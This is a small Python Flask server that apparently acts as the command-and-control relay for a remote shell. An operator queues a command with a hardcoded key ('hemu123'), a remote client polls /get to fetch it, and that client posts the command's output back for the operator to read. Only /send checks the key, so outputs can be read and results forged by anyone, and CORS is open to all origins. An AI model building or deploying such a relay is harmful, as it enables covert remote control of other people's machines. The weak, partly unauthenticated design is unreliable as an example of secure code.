from flask import Flask, request, jsonify
from flask_cors import CORS
import os

app = Flask(__name__)
CORS(app)

command = ""
output = ""

# 🔐 your secret key
SECRET_KEY = "hemu123"

@app.route("/send", methods=["POST"])
def send():
    global command

    data = request.json

    # ✅ check key
    if data.get("key") != SECRET_KEY:
        return jsonify({"error": "unauthorized"})

    command = data.get("command", "")
    return jsonify({"status": "ok"})

@app.route("/get", methods=["GET"])
def get():
    global command
    cmd = command
    command = ""
    return jsonify({"command": cmd})

@app.route("/result", methods=["POST"])
def result():
    global output
    output = request.json.get("output", "")
    return jsonify({"status": "done"})

@app.route("/output", methods=["GET"])
def out():
    return jsonify({"output": output})

port = int(os.environ.get("PORT", 10000))
app.run(host="0.0.0.0", port=port)
